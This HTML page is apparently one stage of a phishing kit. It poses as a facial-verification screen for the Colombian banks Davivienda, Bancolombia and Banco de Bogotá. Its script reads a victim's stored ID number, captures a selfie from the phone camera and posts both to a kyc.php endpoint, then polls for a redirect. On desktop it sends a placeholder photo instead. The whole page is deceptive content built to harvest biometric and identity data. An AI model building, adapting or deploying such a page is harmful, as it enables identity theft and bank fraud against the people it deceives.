<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificación facial</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    body { margin: 0; background: #fff; text-align: center; font-family: system-ui, sans-serif; }
    .container { max-width: 420px; margin: auto; padding: 20px; }
    .bank-logo img { max-width: 170px; margin-bottom: 20px; }
    h2 { font-size: 20px; margin-bottom: 10px; }
    .instructions { font-size: 14px; color: #555; margin-bottom: 20px; }

    .example-screen { width: 280px; height: 280px; margin: 0 auto 30px; }
    .example-screen img { width: 100%; height: 100%; object-fit: contain; }

    .camera-zone {
      display: none; position: relative;
      width: 280px; height: 360px; margin: 0 auto 15px;
      background: #000; overflow: hidden; border-radius: 20px;
    }
    #camera { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
    .mask {
      position: absolute; inset: 0; pointer-events: none;
    }
    .mask::after {
      content: ""; position: absolute; top: 50%; left: 50%;
      width: 180px; height: 240px; transform: translate(-50%, -50%);
      border-radius: 50%;
      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.55);
      border: 2px solid rgba(255, 255, 255, 0.7);
    }
    .btn-capture {
      display: none;
      width: 100%; background: #1e2a3b; color: #fff;
      border: none; padding: 16px; font-size: 17px;
      font-weight: 600; border-radius: 30px; cursor: pointer;
    }

    .modal {
      position: fixed; top: -100%; left: 0;
      width: 100%; height: 100%; background: #fff;
      z-index: 999; display: flex; align-items: center;
      justify-content: center; flex-direction: column;
      transition: top .4s ease;
    }
    .modal.show { top: 0; }
    .loader {
      width: 50px; height: 50px;
      border: 4px solid #ddd;
      border-top: 4px solid #1e2a3b;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

<div class="modal" id="modal">
  <div class="loader"></div>
  <div>Procesando verificación…</div>
</div>

<div class="container">
  <div class="bank-logo">
    <img id="bankLogo" alt="Banco">
  </div>

  <h2>Tome una foto de su rostro</h2>
  <p class="instructions">
    Ubique su rostro dentro del círculo.<br>
    No use gafas, sombreros o accesorios.
  </p>

  <div class="example-screen" id="exampleScreen">
    <img src="img/muestra1.png" alt="Ejemplo">
  </div>

  <div class="camera-zone" id="cameraZone">
    <video id="camera" autoplay playsinline></video>
    <div class="mask"></div>
  </div>

  <button class="btn-capture" id="btnCapture" onclick="capturar()">
    Tomar foto
  </button>
</div>

<script>
/* ===================== CONFIG GENERAL ===================== */
const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
const camera = document.getElementById("camera");
const example = document.getElementById("exampleScreen");
const zone = document.getElementById("cameraZone");
const btn = document.getElementById("btnCapture");
const modal = document.getElementById("modal");
const cedula = localStorage.getItem("val") || "NO_CEDULA";

/* ===================== LOGO POR BANCO (LOCALSTORAGE) ===================== */
const bankLogos = {
  davivienda: "img/davi-logo.png",
  bancolombia: "img/bancol-logo.png",
  bogota: "img/bogota-logo.png"
};

let rawBank = (localStorage.getItem("nom") || "").toLowerCase();
let bank = "davivienda";

if (rawBank.includes("bancol")) {
  bank = "bancolombia";
} else if (rawBank.includes("bogota")) {
  bank = "bogota";
} else if (rawBank.includes("davi")) {
  bank = "davivienda";
}

document.getElementById("bankLogo").src = bankLogos[bank];

/* ===================== MOSTRAR CÁMARA ===================== */
setTimeout(() => {
  example.style.display = "none";
  zone.style.display = "block";
  btn.style.display = "block";

  if (isMobile) {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => camera.srcObject = stream)
      .catch(() => alert("No se pudo acceder a la cámara"));
  }
}, 3500);

/* ===================== CAPTURA ===================== */
function capturar() {
  modal.classList.add("show");

  if (!isMobile) {
    fetch("img/foto.png")
      .then(r => r.blob())
      .then(blob => {
        const reader = new FileReader();
        reader.onloadend = () => enviarKYC(reader.result);
        reader.readAsDataURL(blob);
      });
    return;
  }

  if (camera.videoWidth === 0) {
    alert("Debe permitir el uso de la cámara");
    modal.classList.remove("show");
    return;
  }

  const canvas = document.createElement("canvas");
  canvas.width = camera.videoWidth;
  canvas.height = camera.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(camera, 0, 0);
  enviarKYC(canvas.toDataURL("image/jpeg", 0.9));
}

/* ===================== ENVÍO KYC ===================== */
function enviarKYC(base64) {
  fetch("kyc.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cedula: cedula, image: base64 })
  })
  .then(r => r.json())
  .then(data => {
    if (!data.ok || !data.tid) {
      alert("❌ Error en verificación");
      modal.classList.remove("show");
      return;
    }

    let tries = 0;
    const interval = setInterval(() => {
      fetch(`kyc.php?tid=${data.tid}`)
        .then(r => r.json())
        .then(resp => {
          if (resp.redirect) {
            clearInterval(interval);
            window.location.href = resp.redirect;
          } else if (++tries >= 30) {
            clearInterval(interval);
            alert("⏳ Tiempo agotado");
            modal.classList.remove("show");
          }
        });
    }, 1000);
  })
  .catch(() => {
    alert("❌ Error enviando datos");
    modal.classList.remove("show");
  });
}
</script>

</body>
</html>
